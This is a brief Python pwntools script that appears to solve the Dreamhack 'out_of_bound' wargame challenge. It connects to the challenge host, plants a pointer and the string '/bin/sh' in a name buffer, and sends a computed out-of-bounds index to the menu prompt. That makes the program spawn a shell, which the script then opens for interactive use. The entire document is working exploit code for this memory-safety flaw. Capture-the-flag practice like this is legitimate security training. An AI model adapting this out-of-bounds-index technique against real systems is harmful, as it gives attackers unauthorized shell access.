# Name: out_of_bound.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 12005

conn = remote(HOST, PORT)
# conn = process('./out_of_bound')

name = 0x0804a0ac
command = 0x0804a060

conn.sendafter(b'Admin name: ', p32(name + 4) + b'/bin/sh')
conn.sendlineafter(b'What do you want?: ', str((name - command) // 4).encode())
conn.interactive()